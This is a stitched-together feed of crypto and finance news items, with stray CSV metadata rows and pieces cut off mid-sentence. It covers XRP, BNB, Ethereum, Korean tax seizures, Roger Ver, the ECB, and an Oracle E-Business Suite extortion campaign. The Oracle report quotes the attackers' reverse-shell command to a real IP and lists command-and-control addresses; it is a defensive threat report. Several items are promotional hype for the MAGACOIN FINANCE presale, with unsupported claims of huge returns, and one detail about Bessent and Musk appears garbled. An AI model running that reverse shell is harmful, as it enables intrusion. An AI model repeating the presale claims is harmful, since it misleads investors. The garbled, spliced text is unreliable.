Cardano creator specifically mentioned RLUSD, saying, “We would like to find a path to get RLUSD on Cardano ,” and revealed that Cardano was willing to handle the integration for free as a gesture of goodwill toward the XRP community. Hoskinson noted that discussions were ongoing regarding how to move forward in a way that benefits both parties. His comments suggest that the Cardano ecosystem could soon collaborate directly with Ripple-related projects, marking a shift from past years when the two communities were hostile toward each other .

He described Hoskinson’s statements as a bombshell and said the remarks show how DeFi on Bitcoin and XRP is poised to become a major sector in the market. He told viewers that the large amount of XRP not currently earning yield represents a massive opportunity , saying that as XRP holders begin staking and earning, more tokens will be removed from exchanges. This would reduce supply and strengthen long-term market value. He went on to say that XRP and Cardano are both positioned to benefit from this next phase of DeFi expansion, noting that while there was once friction between their respective communities, Hoskinson’s comments point to a potential alignment. Crypto AI Man concluded his video by expressing optimism about both projects, asserting that XRP and Cardano “can easily make us a lot of money in the next few months and years.” Disclaimer : This content is meant to inform and should not be considered financial advice.

Momentum indicators suggest potential short-term weakness. The RSI is teetering near the neutral line at 48, hinting that sellers could soon take control. The MACD histogram shows similar caution, facing a potential death cross below the signal line today, a classic sign of local tops and the onset of a new downtrend.

The South Korean newspaper Hankook Ilbo reported that the comments came from the National Tax Service (NTS) on October 9. A tax office in the South Korean city of Paju. (Source: Choi Gwang-mo [CC BY-SA 4.0]) South Korean Tax Agency: We Can Confiscate Your Cold Wallet Tax bodies around the country have already launched crackdowns on local tax evaders that hold crypto wallets on domestic trading platforms. In recent weeks, city authorities have expanded these to cover people who fail to pay water bills and traffic fines. But the NTS’ warning shows that the agency is aware that many crypto holders keep their coins offline, using self-custody solutions. An agency spokesperson said: “We can now monitor a non-compliant taxpayer’s crypto transaction history using [blockchain protocol] tracking programs. And if we suspect they are hiding their coins offline, we can conduct searches at their homes, confiscating [hard drives or PCs].” However, one notable blind spot appears to be standing in the NTS’ path. The newspaper wrote: “Problems occur in cases where non-compliant taxpayers use overseas crypto exchanges. Since domestic law does not apply overseas, the [NTS] must rely on the cooperation of foreign governments to determine the nature of a delinquent taxpayer’s assets.” And while the Multilateral Tax Administration Cooperation Agreement allows Seoul to work with 74 nations on tax collection matters, this may not be enough. South Korea has no such agreements with the United States, nor with nations like China or Russia. And there is evidence to suggest that an increasing number of South Korean crypto traders are shunning domestic platforms in favor of foreign or decentralized alternatives . Data from the Financial Supervisory Service (FSS), one of the country’s top financial regulators, shows that as of the first half of this year, the amount of crypto transferred from domestic exchanges to overseas firms or individual wallets amounted to 78.9 trillion won ($55.6 billion). Inside a tax office in Seoul, South Korea. (Source: Cryptonews.com) How Does The NTS Seize Crypto from Domestic Exchange Wallets? Under the terms of the National Tax Collection Act, the tax agency can impose “right to question and inspect” orders on individual accounts. The NTS usually issues these orders to exchanges in habitual non-payment cases, particularly if suspected tax evaders claim they cannot afford to pay their outstanding bills. If the NTS’ probes confirm that the individual holds crypto, the exchange responds by suspending their wallets. A comprehensive stock swap between Naver Financial and Dunamu could significantly boost Naver's corporate value and accelerate its entry into the digital asset payments sector, analysts said Friday. https://t.co/fvuk1zan7S — The Korea Times (@koreatimescokr) September 27, 2025 All coins in the account are then transferred to the NTS’ own wallets. Some local tax bodies then give crypto holders ultimatums, warning them that the tax agency will liquidate the tokens if the holders do not settle their tax bills. If they fail to respond, the agency immediately sells the crypto for fiat “at market price.” According to NTS data submitted to the offices of the Democratic Party lawmaker Kim Young-jin, the tax service “has seized and collected virtual assets from 14,140 delinquent taxpayers over the past four years.” This has seen the NTS and its regional affiliates liquidate 146.1 billion won ($103 million) worth of crypto in the same period.

According to analysts, this change in structure is a show of the institution’s seriousness about adding privacy features directly to the Ethereum ecosystem, moving it from a side project to a main development priority. Expanding Ethereum’s Privacy Framework In an October 8 blog post, EF noted that the “Privacy Cluster” integrates multiple ongoing projects under one umbrella, including long-running efforts by the Privacy & Scaling Explorations (PSE) team. PSE’s portfolio already includes more than 50 open-source research projects, such as Semaphore for anonymous signaling, MACI for private voting, zkEmail for secure communications, and TLSNotary for verifiable web interactions. Igor Barinov will be in charge of the new cluster, and Andy Guzman will still be in charge of PSE, which will focus on early-stage research and development. The group’s goal is to make private transactions, identity verification, and institutional operations safer and easier to use. Some of the most important projects are Private Reads & Writes, which lets users execute private actions on the blockchain; Private Proving, for verifiable proofs without data exposure; and the Institutional Privacy Task Force (IPTF), which connects regulatory compliance with on-chain functionality. Another tool that stands out is the Kohaku wallet SDK, which adds privacy-preserving cryptography for everyday use. The announcement comes just a few weeks after Ethereum developers went into detail about the Fusaka upgrade, which will be available on the mainnet on December 3, saying it will increase the amount of data that can be sent and received as well as the capacity of Layer-2 chains, which are key for scalable privacy. Ethereum’s Evolving Security and Value Proposition In its latest blog, the EF insisted that privacy research has been a part of Ethereum’s DNA since 2018. Given that the network processes billions of dollars in value every day, the foundation says that it is important to keep people’s, institutions’, and developers’ information private to maintain digital trust. The announcement also comes at a time when more institutions are getting involved with Ethereum. Some observers have suggested that the success of Grayscale’s new ETH staking ETF and the growing number of companies building ETH treasuries mean there’s now more scrutiny on Ethereum’s regulatory compliance and data protection, with the IPTF’s work probably gaining importance in these areas. Meanwhile, at the market, the world’s second-largest crypto asset was trading close to $4,400 at the time of this writing. Analysts think it could go as high as $13,000 if current market trends hold, with the blockchain’s security and privacy possibly affecting both adoption and investor confidence.

Both assets have gained fresh traction as large holders stockpile tokens and send them to cold storage—a classic sign of long-term confidence. After regulatory clarity starts to kick in and ETF filings become popular, investors speculate XRP and Solana will benefit from institutional inflows like Bitcoin and Ethereum. However, new on-chain data tells a more complex story. Although whales remain positive on XRP and Solana, many are diversifying their portfolios. Instead of only putting money into large-cap coins, they’re now investing their capital into emerging altcoins that promise much bigger multiples and early-stage growth potential. Why the ETF Buzz Matters An ETF for XRP would be a first in history, especially after Ripple’s court wins and the regulatory hurdles they cleared. If approved, it could unlock billions in institutional liquidity, further legitimising XRP as a settlement layer for global payments. The pressure is on for a Solana ETF as its network continues ruling the Layer-1 performance battle. Solana’s fast network and growing number of developers give it a good chance of being widely adopted soon. Almost everything is possible in the cryptocurrency market, but historical precedent counts against it. Although these assets are fundamentally strong and reliable, the next leg of growth may be steady rather than explosive in nature. That’s why whale wallets are increasingly rotating capital into small and fast-growing projects. MAGACOIN FINANCE Captures Whale Interest One of the primary beneficiaries of this rotation is MAGACOIN FINANCE, which has quickly established itself as an early project favourite. Analysts’ predictions are for huge returns of 40x by 2025, as the project’s presale is surging and whales are accumulating. MAGACOIN FINANCE is different because its unique story meets the fundamentals of the best coins. The tokenomics of the project understand DeFi utilities. This includes liquidity incentives. It also contains 100% audited contracts. By combining strong branding with genuine utility, this is likely one of the few new projects that strikes a balance between hype and creating value. Whales view this dual strength as a long-term possibility. MAGACOIN FINANCE is becoming a symbol of the new altcoin generation as its presale tiers sell out rapidly and community participation is accelerating, combining community-driven energy with real-world verifiable features. A Market Divided: Stability vs. Multiples In today’s investment environment, established blue-chip players like XRP and Solana are contrasted with rising stars such as MAGACOIN FINANCE. XRP and Solana are increasingly being viewed as institutional-grade assets. These are stable and regulatory-compliant and will attract conservative capital via ETFs. They are trustworthy cornerstones of a growing crypto environment. MAGACOIN FINANCE represents the high reward territory, the place whales go to multiply their capital rather than defend it. With low availability and viral momentum growing, presale action captures the same early-mover excitement that historically propelled projects like Dogecoin and Shiba Inu prior to their remarkable jumps. Whales seem to do both and lock positions in well-established mega-caps like XRP and Solana, while also taking early entries into next-gen plays like MAGACOIN FINANCE. Closing Thoughts The possibility of XRP and Solana ETFs is creating excitement in the crypto market. These changes may herald significant growth and validation for both assets in 2025. But, whale activity paints a broader picture – one where the most upside may be seen in smaller and more nimble projects that are still in infancy. Major capital is pouring into MAGACOIN FINANCE, which is quickly shaping up to be one of the breakout tokens of 2025. Early-stage opportunities like this are rare, and whales never ignore them.

Trump, who had once pulled the plug on the pick after a public fight with Musk and resistance inside his own administration, is again weighing the possibility after meeting Jared several times in recent weeks. Two men close to the story confirm Trump and Jared spoke face-to-face in September at a White House dinner for technology leaders, though Elon notably did not show up. The conversations did not stop there, as Bloomberg reported that Trump and Jared also held more private meetings to discuss what kind of future the space program should have under his watch. Trump dropped Jared after clashes with Elon Trump’s problem with the plan started back in June. After a heated back-and-forth with Elon over government spending, Trump posted on Truth Social: “I also thought it inappropriate that a very close friend of Elon, who was in the Space Business, run NASA, when NASA is such a big part of Elon’s corporate life.” He also called Jared a “blue blooded Democrat, who had never contributed to a Republican before.” That same month, Treasury Secretary Scott Bessent warned the White House about the nomination because of Jared’s financial ties to Elon’s company, as Shift4, the payments company Jared owns had invested $27.5 million into SpaceX. Because of that, Elon got into a heated argument with Scott that allegedly ended in the latter punching the former right on his face. Shortly after Elon’s very public breakup with Trump, the president named Transportation Secretary Sean Duffy interim head of NASA. So all of this naturally ended Jared’s official nomination, which was first submitted in December. He then stepped down from his role as CEO at Shift4, choosing to stay on only as executive chairman. In a letter to investors, Jared admitted the failed nomination was not easy but added: “Even knowing the outcome, I would do it all over again.” To his credit, Jared has credentials Trump apparently cannot ignore, having personally flew on two private space missions with SpaceX, one in 2021 and another in 2024, making him one of the very few non-government astronauts with real flight experience. Budget cuts, staff losses, and Elon’s security clearance fight While the nomination drama happens, Trump has also been pushing forward his plan to shrink NASA, as his federal budget proposal includes cutting more than $6 billion from the agency. Elon’s Department of Government Efficiency initiative (nicknamed DOGE) forced changes that cost the agency roughly 4,000 staff members, or one-fifth of its total workforce of 18,000. NASA’s operations have also been battered by the government shutdown in October. The agency kept exceptions in place only for missions connected to SpaceX and Jeff Bezos’ Blue Origin. That meant Elon’s rockets and projects still had workers on duty while other operations froze. Elon also faces another fight outside of budgets and staffing. On Wednesday, U.S. District Judge Denise Cote ordered the government to release information about what kinds of security clearances Elon has. The case was brought by The New York Times against the Defense Counterintelligence and Security Agency after it refused to provide records under the Freedom of Information Act. Judge Cote wrote: “The public has an interest in knowing whether the leader of SpaceX and Starlink holds the appropriate security clearances.” She ruled that Elon’s role as a “special government employee,” combined with his own public statements, outweighed arguments about privacy. The court pointed to a February post where Elon told millions of users: “I’ve had a top secret clearance for many years and have clearances that themselves are classified.” Judge Cote also pointed to Elon’s previous public comments about drug use, specifically in 2023 when he admitted to using ketamine, a federally controlled substance, and again in 2024 when he acknowledged that after smoking marijuana on a podcast, NASA imposed regular drug testing on him. “Musk’s numerous public statements regarding his own drug use and contacts with foreign leaders only enhance the public interest in disclosure,” Cote added. The judge gave the government until October 17 to propose redactions to the clearance documents. The ruling is the latest legal question tied to Elon’s controversial run inside the Trump White House, which ended in May.

52915691,602499,1760054409,https://resources.cryptocompare.com/news/13/52915691.jpeg,“BNB Szn” Is Here: BNB Chain Overtakes Ethereum And Solana In Cross-Chain Activity,https://bitcoinist.com/bnb-chain-overtakes-ethereum-solana-chain-activity/,"BNB is once again in the spotlight as it shatters its all-time high, reaching $1,347 just days after surpassing the $1,000 milestone for the first time in its history. This explosive move highlights Binance’s growing dominance in the crypto ecosystem, as both its token and blockchain ecosystem gain traction across multiple fronts. The rapid price acceleration demonstrates how investor confidence in Binance’s expanding network and utility continues to strengthen, even as the broader market awaits Bitcoin’s next breakout above current resistance levels. According to top analyst Darkfost, momentum across the BNB Chain is now clearly reflected in on-chain flows between networks, signaling a major shift in capital and activity. Binance’s ecosystem is attracting increased attention as DeFi, gaming, and cross-chain applications drive new demand for its infrastructure. This surge in BNB’s value represents more than just price speculation — it mirrors the chain’s expanding role as a central hub in the multichain economy. With the market entering a potential new phase of bullish expansion , BNB’s record-breaking rally positions it as one of the strongest assets in the current cycle, and analysts suggest that its momentum may only be getting started. BNB Chain Leads Cross-Chain Flows According to analyst Darkfost, fresh data from DeBridge confirms that BNB Chain currently ranks #1 in received cross-chain flows, surpassing both Ethereum and Solana — a remarkable milestone that highlights Binance’s growing influence across the crypto ecosystem. This leadership in on-chain activity is not only a technical achievement but also a signal of strong and sustained capital movement toward the Binance ecosystem. As liquidity flows into BNB Chain at record levels, the trend suggests that users and developers are increasingly choosing it as a preferred hub for DeFi, gaming, and tokenized projects. Darkfost explains that tracking these cross-chain flows offers valuable insight into the market’s structural direction. When capital migrates between chains, it often precedes broader price rotations within the altcoin market. Historically, these flow surges have aligned with the early stages of new cycles, where funds first move from Bitcoin into higher-risk assets. The fact that BNB Chain now leads this metric could therefore indicate growing institutional and retail interest converging around Binance’s ecosystem. The coming weeks will be critical for altcoins, as many analysts anticipate a sector-wide breakout if Bitcoin continues its upward momentum. Should BTC push decisively above resistance and enter price discovery, capital could rotate into BNB and other leading altcoins, sparking a fresh wave of rallies. BNB’s network dominance, combined with record-breaking price action, reinforces its status as one of the key barometers of crypto market health — and potentially, one of the biggest beneficiaries of the next bullish phase. Momentum Pauses After Explosive Rally BNB is taking a short breather after an extraordinary rally that pushed the token to an all-time high near $1,347 earlier this week. The chart shows that BNB is now trading around $1,277, down about 2.5% over the last 24 hours, as the market undergoes a mild correction following weeks of uninterrupted bullish momentum. Despite the pullback, the overall market structure remains decisively bullish, supported by rising 50-, 100-, and 200-period moving averages on the 4-hour timeframe. The recent consolidation above the $1,250–$1,270 range indicates that bulls are actively defending this zone, which now serves as short-term support. A rebound from here could set the stage for a new attempt to retest the $1,340–$1,350 resistance area. If this level breaks with conviction, it could open the door for another leg higher, potentially targeting $1,500 in the coming sessions. However, failure to maintain support above $1,250 could trigger deeper retracements toward $1,180 or even the $1,100 region, where the 50-period moving average currently lies. Overall, BNB remains one of the strongest performers in the market, showing sustained strength despite short-term volatility — a sign that investor confidence and on-chain activity continue to align with bullish momentum.

In a recent video shared on the social media platform X, crypto commentator Zach Rector described what he called the inconvenient truth of this market cycle: XRP is currently outperforming most of the top 50 cryptocurrencies in percentage growth since the last US presidential election and from the depths of the previous bear market. Ethereum, BNB, And Bitcoin’s Performance Rector began his comparison by pointing to Ethereum’s recovery trajectory. According to Ethereum’s price chart, investors who bought Ethereum before the most recent US presidential election have seen returns of about 89%, while long-term holders who entered during the 2022 bear market lows and are yet to sell are currently sitting on 400% gains. Related Reading: XRP Price Completes 7-Year Double Bottom Amid Prep For Moonshot To $19 BNB, he said, has delivered slightly better results, with 109% returns for pre-election buyers and 527% for those who accumulated during the 2022 bear market lows. Turning to Bitcoin, Rector noted that even after breaking to multiple new all-time highs this cycle, its returns are modest compared to XRP. He pointed out that a Bitcoin purchase before the election would have yielded an 82% return, while those who entered around the bear market bottom and are yet to sell would have gained around 678% on their Bitcoin holdings. XRP Outperforming The Market It’s a fact that XRP’s price action this cycle is much better than its performance in the 2021 crypto market bull run, where its growth was hampered by the SEC-Ripple lawsuit. Therefore, Zach Rector’s main point focuses on XRP’s strength within the current market cycle. Related Reading: Bitcoin, XRP Testing Key Resistances And Could Turn Messy Again – Here’s Why He stated that if an investor had purchased XRP at $0.50 before the election, their position would now be up 500%. On the other hand, those who bought at the bear market bottom and are still holding would have seen an extraordinary 900% gain. As such, these numbers make XRP one of the most profitable assets among the major cryptocurrencies, outperforming Bitcoin, Ethereum, and BNB. In his words, “The inconvenient truth about the 2025 crypto bull run, and this is why people are so upset, is that XRP is still outperforming nearly all of the top 50 cryptos.” The statement quickly gained traction within the XRP community, as shown by the comments on his video posted on X. XRP price action in the past few days, however, has been majorly corrective. The price has been drifting lower toward a critical support level around $2.80, which is now an important level for bulls to defend. A breakdown below $2.8 could expose the next support at $2.72, while maintaining it could set the stage for another upward move. Even with this cooling phase, many XRP enthusiasts and analysts are optimistic. Many expect the token to break above $4 in the coming months, with some predicting that it could eventually enter double-digit territory once Spot XRP ETFs are launched in the US.

52915770,https://en.bitcoinsistemi.com/?p=179629,1760054459,https://resources.cryptocompare.com/news/81/52915770.jpeg,XRP Price Prediction — Ripple Eyes $5 as Market Analysts Project 40% ETF-Driven Upside,https://en.bitcoinsistemi.com/xrp-price-prediction-ripple-eyes-5-as-market-analysts-project-40-etf-driven-upside/,"XRP has entered a renewed market optimism as analysts predict a 40% ETF-led upside that could take the token towards the $5 level. The outlook is promising based on strong on-chain data that has seen whale accumulation and fresh capital entering Ripple’s ecosystem. According to market data, over the past few days, whale wallets ranging between 10 and 100 million XRP have added more than 250 million tokens, approximately $125 million worth of XRP. This buildup has strengthened bullish sentiment, indicating that large investors are lined up for another massive rally. With ETF speculation increasing to a fresh record and liquidity building, the long-term momentum behind the recovery appears to be strengthening for XRP, both from a retail and an institutional perspective. Amid this optimism, another cryptocurrency, MAGACOIN FINANCE, has risen on analysts’ radar, currently regarded as one of the most successful altcoins of the year. Ripple’s Market Position Strengthens Ahead of ETF Momentum Ripple is further growing its global value chain with partnerships with top banks and payment service providers. Several leading financial institutions are already implementing the company’s technology for cross-border transactions, underscoring its increasing relevance in the traditional finance domain. Recent announcements, such as Ripple’s strategic partnership with Bahrain Fintech Bay, highlight Ripple’s dedication to promoting blockchain adoption in emerging markets. This convergence of traditional and decentralized finance has solidified Ripple’s role as a central player in global payments. As ETF speculation intensifies, these developments solidify Ripple’s long-term price outlook, positioning XRP as a consistent contender on watchlists. XRP Price Analysis and Current Market Trends XRP is trading at around $2.97, holding strong support above the $2.80 mark, a strong price zone which analysts cite as the key point for the next breakout. Technical analysis indicators show that this support has proven to be strong against volatility, indicating that the market has been building confidence. Source: CoinMarketCap Trading volumes have also surged in recent weeks, as both whales and retail investors show increasing interest. With ETF optimism driving inflows, XRP has built up a distinct bullish structure that aligns with its long-term price outlook for 2025. If there is persistent momentum, a move towards the $5 resistance level is anticipated, indicating renewed market confidence for XRP. Market Analysts Project 40% ETF-Driven Upside Analysts anticipate ETF-related gains propelling XRP by a minimum of 40%, as institutional demand continues to grow exposure to legally acceptable crypto assets. Canary Capital CEO Steve McClurg now projects that the ETF could see another $10 billion inflow, up from the previously projected $5 billion. He stated that high investor demand would result in XRP being one of the top ten ETF launches of all time. Historical evidence supports this view. In past cycles, XRP inflows of $61 million have generated a $16.6 billion market cap increase for the asset, a multiplier of 272X XRP’s cost. Even with reduced levels, analysts believe ETF inflows could still create meaningful upside, taking XRP closer to its long-term target of $5. As XRP positions for a 40% upside, analysts are also switching their focus to another upcoming altcoin, MAGACOIN FINANCE. The project has become a trending topic amongst market watchers who predict up to 1,400% gains by the end of the year. This valuation projection is the result of an unparalleled surge in whale participation, pushing the early rounds of funding to close prematurely. Massive accumulation from large investors has sparked robust momentum that is triggering excitement across trading communities. This return of whales is a clear indicator that institutional buyers are forecasting a bull rally is coming. Their aggressive entry confidence has led retail investors to rush in to not miss the expected returns. This FOMO effect has heightened the discussion around the project’s ecosystem, with analysts calling MAGACOIN FINANCE one of the most mentioned new tokens currently in circulation. Its liquidity is increasing visibly, which is establishing it as one of the most promising high-ROI altcoins in 2025 . Factors Supporting the XRP $5 Target Several factors are fueling XRP’s expected bull run. ETF-led inflows are likely to add liquidity while institutionalizing exposure. Ripple’s growing integration across global banking networks serves as a stable demand base. Whale accumulation activity also sustains multiyear price stability, meaning major holders remain convinced. Combined with improving macro sentiment and increasing cryptocurrency inflows, these factors add to the positive case for XRP to reach the $5 mark during the upcoming market rally. Final Thoughts The latest XRP price prediction reinforces confidence in Ripple’s market outlook, with analysts pointing to ETF inflows as the next major catalyst. A 40% move remains realistic if institutional demand meets current projections. Alongside XRP’s institutional resurgence, MAGACOIN FINANCE continues to capture market attention as a high-ROI opportunity driven by whale accumulation and retail excitement. Together, these assets define the dual narrative of 2025, XRP for institutional strength, and MAGACOIN FINANCE for exponential returns.

The New York Times reported on Thursday that Ver’s attorneys and U.S. authorities had reached a provisional arrangement that would compel the proponent of Bitcoin to pay $48 million in taxes due on his cryptocurrency assets. In April 2024, the Justice Department sought to extradite him from Spain to stand prosecution on charges of tax evasion and mail fraud. According to The New York Times, Bitcoin Jesus has ties to figures associated with the administration of US President Donald Trump, including hiring lawyers who initially worked for the president. Reports indicate that he also paid $600,000 to Roger Stone, a political consultant and Trump adviser, to lobby for changes to U.S. tax laws. The development follows a series of regulatory and legal actions taken under the Trump administration, which eased the enforcement of digital asset cases. The original indictment alleges that Ver misrepresented information on tax forms related to his crypto holdings. According to the DOJ, he and two of his firms, Memory Dealers and Agilestar, allegedly held approximately 131,000 BTC in 2014. The DOJ added that he attempted to evade paying taxes on his assets by renouncing his U.S. citizenship and subsequently becoming a citizen of St. Kitts and Nevis. “Even though Ver was not then a US citizen, he was still legally required to report to the IRS and pay tax on certain distributions,” said the Justice Department in April 2024. Ties to Trump allies and lobbying efforts surface amid legal battle Spanish authorities arrested Ver following his U.S. indictment in 2024, though he secured bail just days later. Since then, his legal team has been contesting Spain’s extradition efforts and defending him against the charges in U.S. federal court. Following Donald Trump’s 2024 reelection, his administration has taken numerous steps toward being friendlier to the crypto sector, from dropping probes into big-name firms like Coinbase and Binance to designating supportive leadership at the helm of key federal agencies. Many in the crypto community speculated that the president might grant Bitcoin Jesus a pardon. Ross Ulbricht, the founder of the darknet marketplace Silk Road and one of the first individuals to receive a pardon from Trump, called for leniency in Ver’s case. “No one should spend the rest of their life in prison over taxes,” said Ulbricht in February. “Let him pay the tax (if any) and be done with it.” Crypto community rallies as speculation grows over a possible Trump pardon In a related episode, Bloomberg reported that a $30 million plan to buy a presidential pardon for Ver fell apart before it could move forward. The effort was allegedly led by two controversial figures: Florida businessman Matt Argall, who calls himself “Lord Argall,” and crypto entrepreneur Brock Pierce. They discussed the scheme over dinner in Puerto Rico after Trump’s reelection. As of Thursday, Ver’s X profile directed users to a petition urging Trump to pardon him. His website also featured an open letter calling on the U.S. government to drop the case, describing it as a “retaliatory action” against his advocacy for Bitcoin. On Thursday afternoon, traders on the prediction platform Polymarket raised the probability of Trump pardoning the Bitcoin proponent, increasing the odds from 23% to 29%.

As a result, they agreed there was room to maintain a steady hand until clearer economic signals emerge, according to the meeting accounts released Thursday. The ECB kept interest rates on hold in September and even sounded a slightly optimistic note about the outlook for the euro area economy, suggesting that the bar is high for any further rate cuts despite remaining concerns about the effect of U.S. tariffs. At the time, Inflation was around the 2% medium-term target, and the Governing Council’s assessment of the inflation outlook was broadly unchanged. “The current level of interest rates should be seen as sufficiently robust in managing shocks, in view of two-sided inflation risks and taking into account a broad range of possible scenarios,” the accounts of the meeting showed. The new ECB staff projections presented an inflation outlook similar to that projected in June. They expected headline inflation to average 2.1% in 2025, 1.7% in 2026, and 1.9% in 2027. For inflation excluding energy and food, they expected an average of 2.4% in 2025, 1.9% in 2026, and 1.8% in 2027. The economy is projected to grow by 1.2% in 2025, revised up from the 0.9% expected in June. The growth projection for 2026 has been slightly lowered to 1.0%, while the projection for 2027 remains unchanged at 1.3%. ECB adopts wait-and-see stance as markets rule out more rate cuts for 2025 Since the September meeting, the likelihood of additional rate cuts has further diminished , supported by moderate economic data and recent comments from ECB President Christine Lagarde, who suggested that the risks surrounding the inflation outlook are narrowing. Markets now price in virtually no chance of a rate cut this year after a total of two percentage points of easing through June. Instead, traders see only a one-in-three probability of a final reduction in the first half of next year. While policymakers agreed that the economic outlook would inevitably shift, they were uncertain about the direction. “Several” members warned that inflation could fall short of the ECB’s 2% target, while a “few” cautioned it might exceed it. “The current situation was likely to change materially at some point, but it was currently difficult to know when and in which direction,” the ECB said. “There continued to be a high option value to waiting for more information.” ECB stays cautious as easing hopes fade amid fragile European outlook Despite this uncertainty, policymakers note d that in coming data largely aligned with their previous forecasts, and some of the worst-case risks had receded following a trade deal with the United States. For now, the ECB plans to monitor the evolving effects of tariffs, ongoing economic uncertainties, and other potential risks—including a stronger euro, Chinese dumping practices, a possible U.S. market correction, and rising defense expenditures. Still, investors believ e th e door to further easing hasn’t completely closed. Economic fragility persists across major European economies. France faces domestic turmoil, while Germany’s industrial production and exports to the U.S. are plunging.

Google Threat Intelligence and Mandiant tracked the exploitation operation to attackers that might be associated with the CL0P extortion group. Google’s Threat Intelligence Group (GTIG) and Mandiant have brought an extensive extortion campaign that exploits the vulnerabilities in Oracle’s E-Business Suite (EBS) to light. The extortion campaign has resulted in the theft of large volumes of customer data. They said the operation began on September 29, 2025 and involved a group claiming ties to the CL0P extortion brand. Google and Mandiant reveal zero-day exploitation According to Google’s report, the attackers sent a “high volume” of emails to executives across multiple organizations, alleging breaches of their Oracle EBS environments and threatening to publish stolen data unless a ransom was paid . The emails, sent from hundreds of compromised third-party accounts, included contact addresses, support@pubstorm.com and support@pubstorm.net , previously linked to the CL0P data leak site. Google and Mandiant’s joint investigation found that the exploitation activity dates back to as early as July 2025, possibly linked to a zero-day vulnerability now tracked as CVE-2025-61882. In some cases, the attackers reportedly exfiltrated “a significant amount of data” from affected organizations. Oracle stated that the exploited flaws had been fixed in July, but later issued emergency updates on October 4 to address additional vulnerabilities. Oracle told its customers to use the latest critical patch updates and stressed that staying current on all patches is essential to prevent compromise. The CL0P extortion brand has been active since 2020 and is historically tied to the FIN11 cybercrime group. It has previously targeted managed file transfer systems like MOVEit, GoAnywhere, and Accellion FTA. Those campaigns followed a similar pattern of the mass exploitation of zero-day vulnerabilities, theft of sensitive data, and extortion weeks later. At the time of the report , no new victims from this incident had appeared on CL0P’s data leak site. Complex, multi-stage Java implants Google and Mandiant’s technical breakdown reveals that the attackers used multiple exploit chains targeting Oracle EBS components, including UiServlet and SyncServlet, to achieve remote code execution and plant multi-stage Java implants. In July 2025 there was suspicious activity that involved HTTP requests to /OA_HTML/configurator/UiServlet. This suspicious activity was observed in another exploit that later surfaced in a Telegram group named “SCATTERED LAPSUS$ HUNTERS.” The leaked exploit made use of several advanced techniques to gain control over targeted servers, such as a server-side request forgery (SSRF), an authentication bypass, and a XSL template injection. By August 2025, the attackers began using another tool called SyncServlet to make and run harmful templates inside the EBS database. These templates contained Base64-encoded XSL payloads that loaded Java-based malware directly into memory. Among the identified implants were GOLDVEIN.JAVA, a downloader that retrieved second-stage payloads from attacker-controlled command servers, and a multi-layered chain dubbed SAGE, which installed persistent Java servlet filters for further exploitation. After breaching the system, the attackers used the EBS account “applmgr” to explore the system, collect network and system details, and then install more malicious files. The attackers also used shell commands such as ip addr, netstat -an, and bash -i >& /dev/tcp/200.107.207.26/53 0>&1. The IP addresses 200.107.207.26 and 161.97.99.49 were identified in exploitation attempts, while 162.55.17.215:443 and 104.194.11.200:443 were listed as command-and-control servers for the GOLDVEIN.JAVA payload. GTIG has not formally linked the operation to any known group, but the campaign shares similarities with FIN11, which is a financially motivated cybercrime group that was previously associated with CL0P ransomware and large-scale data theft operations. Mandiant also noted that one of the compromised accounts used to send the extortion emails had been used in earlier FIN11-related attacks. Users are urged to be suspicious of EBS database tables XDO_TEMPLATES_B and XDO_LOBS, especially those with names beginning with “TMP” or “DEF”, and to block external internet traffic from EBS servers to prevent more data extortion. The organizations also recommend close monitoring of HTTP requests to endpoints like /OA_HTML/SyncServlet and /OA_HTML/configurator/UiServlet, and analyzing memory dumps for evidence of in-memory Java payloads.

Over the past few months, Ethereum (ETH) has shown an unusually tight correlation with the Russell 2000, the U.S. index tracking small-cap companies. According to research from Milk Road Macro, the two assets have moved in “eerily precise” sync – suggesting that both could soon react powerfully to an environment of lower interest rates and rising liquidity. That same liquidity narrative has sparked renewed excitement across the broader crypto market. With traders almost certain that more Federal Reserve rate cuts are coming, risk assets are starting to rebound. Investors are now looking for the projects best positioned to benefit from easier monetary conditions – and among them, MAGACOIN FINANCE has become the breakout success story of 2025. The project has already raised $16.5 million and, at its current price of $0.00052186, analysts estimate a potential 13x upside as its next phase of expansion approaches. Rate Cuts Could Ignite a New Wave of Crypto Growth Markets are pricing in a 96% probability of a 25-basis-point cut in late October and an 82% chance of another by December, according to CME futures data. Such high expectations have fueled optimism across both traditional and digital markets. For Ethereum, in particular, rate cuts could prove especially powerful. As a yield-generating asset through staking, Ethereum’s return profile becomes more attractive when central bank rates fall. “Ethereum isn’t just a speculative asset – it generates yield,” explained Justin d’Anethan, head of partnerships at Arctic Digital. “When interest rates drop, that yield becomes even more attractive.” This yield sensitivity positions ETH to outperform Bitcoin in a rate-cut cycle, as institutional and retail investors seek both exposure to crypto and steady on-chain income. A Broader Risk-On Rotation Macro trader Michaël van de Poppe believes Ethereum is on the verge of a breakout. He points to the ETH/BTC pair showing early signs of reversal after months of consolidation – a move that often signals renewed market appetite for altcoins. At the same time, gold’s record surge above $4,000 per ounce could be nearing exhaustion, potentially triggering a flow of capital from defensive holdings into higher-growth assets like Ethereum. “If the global easing cycle continues, we’ll see a strong rotation into markets with upside potential,” van de Poppe said. “Ethereum fits that category perfectly.” Technicals Hint at an Explosive Setup From a charting perspective, Ethereum appears to be forming a cup-and-handle pattern – a bullish structure that typically signals continuation after consolidation. Technical analyst Matt Hughes notes that ETH has stabilized between $4,350 and $4,400, an area likely serving as a launchpad for the next move upward. His near-term resistance target is around $5,200, while other analysts, such as the pseudonymous trader Poseidon, are forecasting a potential cycle peak around $8,500. Despite a mild 6% pullback, market sentiment remains positive. Traders widely agree that if the Fed maintains its path of rate cuts through year-end, Ethereum could become one of the most significant beneficiaries of renewed liquidity – possibly even challenging its previous all-time highs. MAGACOIN FINANCE Emerges as the Presale King of 2025 As Ethereum strengthens, smaller projects are also attracting serious investor attention. MAGACOIN FINANCE has taken the spotlight as the top presale of 2025, outperforming all rivals in both fundraising and community engagement. The project’s remarkable ability to maintain momentum during volatile market conditions has set it apart as a rare success story in an otherwise cautious landscape. In just a few months, MAGACOIN FINANCE has raised $16.5 million, drawing thousands of new participants eager to secure early positions before broader exchange listings. With its rapidly expanding ecosystem and upcoming utility integrations, the project has become a talking point across major crypto forums and social platforms. Analysts covering early-stage opportunities predict that investors entering at the current $0.00052186 price level could see returns of up to 13x as MAGACOIN FINANCE moves into its next phase. Beyond its price potential, what has truly impressed the community is the project’s clear roadmap, active development, and ability to consistently deliver on milestones – qualities often lacking in typical presale tokens. This growing reputation has cemented MAGACOIN FINANCE as a leading example of how early participation in well-managed projects can generate massive upside, even during uncertain macro conditions. The Big Picture: Ethereum Leads, but Altcoins Are 